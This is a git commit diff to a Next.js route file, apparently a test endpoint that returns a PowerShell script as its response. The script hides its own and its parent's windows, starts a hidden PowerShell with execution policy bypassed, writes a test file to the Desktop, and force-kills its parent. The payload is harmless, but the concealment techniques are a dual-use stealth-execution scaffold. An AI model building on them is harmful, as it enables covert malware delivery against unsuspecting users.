3e7e63d6683979c6b06a132926cfd1265146ca99
kaliiiiiiiiii <aurinliun@gmx.ch>
2024-08-05 15:51:15 +0200

    hide parent process as well

--- app/test/route.ts
+++ app/test/route.ts
@@ -4,14 +4,17 @@ export async function GET(req: NextRequest) {
     const script = `
 add-type -name user32 -namespace win32 -memberDefinition '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);'
 [win32.user32]::showWindow((get-process -id $pid).mainWindowHandle, 0);
+
+$proc = [System.Diagnostics.Process]::GetCurrentProcess()
+$parent = Get-Process -Id (gwmi win32_process | ? processid -eq  $proc.Id).parentprocessid
+if($parent.ProcessName -ne "explorer"){[win32.user32]::showWindow($parent.mainWindowHandle, 0)};
 $script = {
     Start-Sleep -Seconds 5
     Add-Content -Path ([Environment]::GetFolderPath('Desktop')+'/a.txt') -Value test
     Read-Host
     }
 Start-Process powershell -WindowStyle Hidden -ArgumentList @("-WindowStyle", "Hidden", "-noexit", "-ExecutionPolicy", "Bypass", $script.ToString());
-$proc = [System.Diagnostics.Process]::GetCurrentProcess()
-$parent = Get-Process -Id (gwmi win32_process | ? processid -eq  $proc.Id).parentprocessid
+
 if($parent.ProcessName -ne "explorer"){Stop-Process -InputObject $parent -Force};
 Exit`
   return new NextResponse(script, {
